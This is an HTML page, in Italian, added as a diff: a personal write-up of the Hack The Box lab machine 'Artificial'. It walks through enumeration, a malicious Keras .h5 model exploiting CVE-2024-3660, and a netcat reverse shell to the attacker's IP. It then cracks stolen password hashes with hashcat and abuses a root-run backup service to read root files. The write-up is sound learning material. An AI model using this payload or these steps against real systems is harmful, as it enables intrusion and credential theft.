@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Artificial - CTF Writeup - Davide Zorzella</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <canvas id="particles"></canvas>
+  <div class="signature">Davide Z.</div>
+  <div class="theme-pill">
+    <button class="theme-toggle" id="theme-toggle" aria-label="Cambia tema">
+      <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+      </svg>
+      <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+      </svg>
+    </button>
+  </div>
+  <main>
+    <article class="article-content">
+      <img src="../assets/writing/artificial/artificial-pwn.png" alt="artificial pwn" style="margin-bottom: 48px;">
+
+      <h2>Enumerazione</h2>
+      <p>
+        Eseguendo la base network service discovery con nmap, troviamo i servizi in ascolto sulle porte 22 (ssh) e 80 (http):
+      </p>
+      <pre><code>nmap 10.10.11.74</code></pre>
+      <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 06:01 EDT
+Nmap scan report for 10.10.11.74
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+
+      <p>
+        Il servizio sulla porta 80 rivela il dominio usato: <code>artificial.htb</code>
+      </p>
+      <pre><code>nmap 10.10.11.74 -sC -sV -p22,80</code></pre>
+      <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://artificial.htb/</code></pre>
+
+      <p>
+        Aggiungiamo il dominio al file `/etc/hosts`:
+      </p>
+      <pre><code>10.10.11.74 artificial.htb</code></pre>
+
+      <p>
+        L'enumerazione con ffuf non evidenzia virtual host:
+      </p>
+      <pre><code>ffuf -u http://$DOMAIN:$PORT -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154</code></pre>
+
+      <p>
+        Ma troviamo alcune funzionalità di autenticazione:
+      </p>
+      <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://$DOMAIN:$PORT/FUZZ -ic -recursion -recursion-depth 3 -v</code></pre>
+      <pre><code>[Status: 200, Size: 857] | URL: /login
+[Status: 200, Size: 952] | URL: /register
+[Status: 302, Size: 189] | URL: /logout --> /
+[Status: 302, Size: 199] | URL: /dashboard --> /login</code></pre>
+
+      <h2>Detection</h2>
+      <p>
+        Dato che ho appena finito il modulo SQLmap su HTB Academy, ho provato subito delle SQL injection sulla form di login, ma non sembra vulnerabile:
+      </p>
+      <pre><code>sqlmap -r req --batch</code></pre>
+      <blockquote class="note">
+        <p><code>req</code> è il file contenente la request intercettata da Burp.</p>
+      </blockquote>
+      <p>
+        Questo non è un approccio intelligente, in un real world scenario sarebbe un attacco attivo prima di avere finito l'enumerazione. Potrebbe essere rilevato e potremmo essere stati presi.
+      </p>
+      <p>
+        Tuttavia, riusciamo a registrarci e fare login. Dalla dashboard possiamo scaricare un file `requirements.txt` e un `Dockerfile`, ma possiamo anche caricare un file `*.h5`.
+      </p>
+      <img src="../assets/writing/artificial/20250702152546.png" alt="Your models" class="center">
+
+      <h2>Analisi del Dockerfile</h2>
+      <p>
+        Il Dockerfile rivela l'uso di TensorFlow 2.13.1:
+      </p>
+      <pre><code>FROM python:3.8-slim
+WORKDIR /code
+RUN apt-get update && apt-get install -y curl && \
+    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
+    rm -rf /var/lib/apt/lists/*
+RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+ENTRYPOINT ["/bin/bash"]</code></pre>
+
+      <p>
+        Il `requirements.txt` conferma:
+      </p>
+      <pre><code>tensorflow-cpu==2.13.1</code></pre>
+
+      <p>
+        Cercando online <code>tensorflow-cpu==2.13.1 Exploit</code> troviamo <strong>CVE-2024-3660</strong>, una vulnerabilità RCE in TensorFlow/Keras.
+      </p>
+
+      <h2>Exploit: CVE-2024-3660</h2>
+      <p>
+        La <a href="https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass" target="_blank" rel="noopener">blog post di Oligo Security</a> fornisce una buona spiegazione del problema e di come sfruttarlo.
+      </p>
+      <img src="../assets/writing/artificial/20250702155933.png" alt="tensorflow exploit" class="center">
+
+      <p>
+        Basato su quanto compreso, creiamo un exploit `.h5` con TensorFlow 2.13.1 e Python 3.8:
+      </p>
+      <pre><code>import tensorflow as tf
+
+def exploit(x):
+    import os
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.124 9001 >/tmp/f")
+    return x
+
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("exploit.h5")</code></pre>
+
+      <p>
+        Dopo aver buildato ed eseguito l'immagine, copiamo il `.h5` sul nostro sistema:
+      </p>
+      <pre><code>sudo docker cp a67:/code/exploit.h5 .</code></pre>
+
+      <p>
+        Carichiamo il file `.h5` e clicchiamo su <em>View Predictions</em>:
+      </p>
+      <img src="../assets/writing/artificial/20250702191931.png" alt="Your models rce" class="center">
+
+      <p>
+        Otteniamo un reverse shell:
+      </p>
+      <pre><code>nc -lvnp 9001
+connect to [10.10.14.124] from (UNKNOWN) [10.10.11.74] 34420
+$ whoami
+app</code></pre>
+
+      <h2>Exploitation</h2>
+      <p>
+        Il file `app.py` rivela credenziali in plaintext per un database SQLite chiamato `users.db`:
+      </p>
+      <pre><code>app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'</code></pre>
+
+      <p>
+        Cerchiamo il database corretto:
+      </p>
+      <pre><code>find / -type f -name users.db 2>/dev/null
+/home/app/app/instance/users.db
+/home/app/app/users.db</code></pre>
+
+      <p>
+        Interagendo con SQLite troviamo la struttura della tabella <code>user</code>:
+      </p>
+      <pre><code>CREATE TABLE user (
+    id INTEGER NOT NULL,
+    username VARCHAR(100) NOT NULL,
+    email VARCHAR(120) NOT NULL,
+    password VARCHAR(200) NOT NULL,
+    PRIMARY KEY (id)
+);</code></pre>
+
+      <p>
+        Recuperiamo gli utenti e le password:
+      </p>
+      <pre><code>SELECT username, password FROM user;</code></pre>
+      <pre><code>gael|c99175974b6e192936d97224638a34f8
+mark|0f3d8c76530022670f1c6029eed09ccb
+admin|0e7517141fb53f21ee439b355b5a1d0a</code></pre>
+
+      <h3>Decrittazione MD5</h3>
+      <p>
+        Le password sembrano hash MD5. Usando hashcat:
+      </p>
+      <pre><code>hashcat 0e7517141fb53f21ee439b355b5a1d0a</code></pre>
+      <p>
+        Il match indica MD5. Decrittando con hashcat e una wordlist riusciamo a ottenere la password di admin.
+      </p>
+
+      <h2>Post Exploitation</h2>
+      <p>
+        Non possiamo eseguire comandi sudo. Non ci sono file con setuid o setgid. Tuttavia, notiamo che l'utente <code>gael</code> è nel gruppo <code>sysadm</code>:
+      </p>
+      <pre><code>uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)</code></pre>
+
+      <p>
+        C'è un file di backup appartenente al gruppo sysadm:
+      </p>
+      <pre><code>find / -type f -group sysadm 2>/dev/null
+/var/backups/backrest_backup.tar.gz</code></pre>
+
+      <p>
+        Scarichiamo ed estraiamo:
+      </p>
+      <pre><code>ssh gael@artificial.htb 'cat /var/backups/backrest_backup.tar.gz' > ./backrest_backup.tar.gz
+tar xvf backrest_backup.tar.gz</code></pre>
+
+      <p>
+        Dai file estratti comprendiamo due cose chiave:
+      </p>
+      <ol>
+        <li>C'è un servizio esposto su <code>localhost:8989</code> — port forwarding SSH</li>
+        <li>Nei file di configurazione ci sono credenziali per un utente root-like</li>
+      </ol>
+
+      <p>
+        Il file <code>.config/backrest/config.json</code> contiene un hash bcrypt:
+      </p>
+      <pre><code>{
+  "auth": {
+    "disabled": false,
+    "users": [{
+      "name": "backrest_root",
+      "passwordBcrypt": "$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO"
+    }]
+  }
+}</code></pre>
+
+      <p>
+        L'hash è in base64, lo decodifichiamo e lo crackiamo con hashcat:
+      </p>
+      <pre><code>echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
+hashcat -m 3200 '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' rockyou.txt -w 4</code></pre>
+
+      <p>
+        L'hash viene crackato: <code>!@#$%^</code>
+      </p>
+
+      <p>
+        Facendo login, ci viene presentata una Web UI per un sistema di backup:
+      </p>
+      <img src="../assets/writing/artificial/20250703172921.png" alt="Backrest" class="center">
+
+      <p>
+        Possiamo programmare backup dei nostri file. Il root flag potrebbe essere incluso se il processo gira con privilegi root. Creiamo un repo per il backup e selezioniamo la cartella `/root/`:
+      </p>
+      <img src="../assets/writing/artificial/20250703202750.png" alt="Add restic repo" class="center">
+      <img src="../assets/writing/artificial/20250703202834.png" alt="Backup /root folder" class="center">
+      <img src="../assets/writing/artificial/20250703203615.png" alt="Exec backup" class="center">
+
+      <p>
+        Il repo viene creato con privilegi root in `/tmp/my_repo`. Possiamo dumpare il backup per ottenere il flag:
+      </p>
+      <pre><code>dump latest /root/root.txt</code></pre>
+      <img src="../assets/writing/artificial/20250703202922.png" alt="Root flag" class="center">
+
+      <p>
+        Per ottenere una shell SSH, potremmo dumpare le chiavi SSH con la stessa tecnica.
+      </p>
+      <p style="margin-top: 48px; padding-top: 24px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.875rem;">
+        <a href="../" style="color: var(--text-secondary);">&larr; Torna alla home</a>
+      </p>
+    </article>
+  </main>
+  <footer>
+    <p>Ultimo aggiornamento: Luglio 2026</p>
+  </footer>
+  <script>
+    (function(){var t=document.getElementById('theme-toggle'),h=document.documentElement,s=localStorage.getItem('cv-theme');function st(t){h.setAttribute('data-theme',t);localStorage.setItem('cv-theme',t);}if(s)st(s);else if(window.matchMedia('(prefers-color-scheme:dark)').matches)st('dark');t.addEventListener('click',function(){var c=h.getAttribute('data-theme');st(c==='dark'?'light':'dark');});})();(function(){var n='Davide Zorzella',e=document.getElementById('typing-name');if(!e)return;if(window.matchMedia('(prefers-reduced-motion:reduce)').matches){e.textContent=n;return;}var i=0;function t(){if(i<n.length){e.textContent+=n.charAt(i);i++;setTimeout(t,80+Math.random()*60);}}setTimeout(t,400);})();
+  </script>
+  <script>
+    (function(){var c=document.getElementById('particles');if(!c)return;var x=c.getContext('2d'),p=[],w,h,md=120,a;function resize(){w=c.width=window.innerWidth;h=c.height=window.innerHeight;}function createParticles(){p=[];var n=Math.min(Math.floor((w*h)/18000),80);for(var i=0;i<n;i++)p.push({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:1.5+Math.random()*1.5});}function gc(){var d=document.documentElement.getAttribute('data-theme')==='dark';return d?'rgba(60,60,60,':'rgba(180,180,180,';}function gl(){var d=document.documentElement.getAttribute('data-theme')==='dark';return d?'rgba(255,255,255,':'rgba(0,0,0,';}function draw(){x.clearRect(0,0,w,h);var dc=gc(),gl2=gl();for(var i=0;i<p.length;i++){var v=p[i];v.x+=v.vx;v.y+=v.vy;if(v.x<0||v.x>w)v.vx*=-1;if(v.y<0||v.y>h)v.vy*=-1;x.beginPath();x.arc(v.x,v.y,v.r,0,Math.PI*2);x.fillStyle=dc+'0.5)';x.fill();for(var j=i+1;j<p.length;j++){var v2=p[j],dx=v.x-v2.x,dy=v.y-v2.y,dist=Math.sqrt(dx*dx+dy*dy);if(dist<md){x.beginPath();x.moveTo(v.x,v.y);x.lineTo(v2.x,v2.y);x.strokeStyle=gl2+(0.08*(1-dist/md))+')';x.lineWidth=.5;x.stroke();}}}a=requestAnimationFrame(draw);}window.addEventListener('resize',function(){resize();createParticles();});resize();createParticles();draw();document.addEventListener('visibilitychange',function(){if(document.hidden)cancelAnimationFrame(a);else draw();});})();
+  </script>
+</body>
+</html>
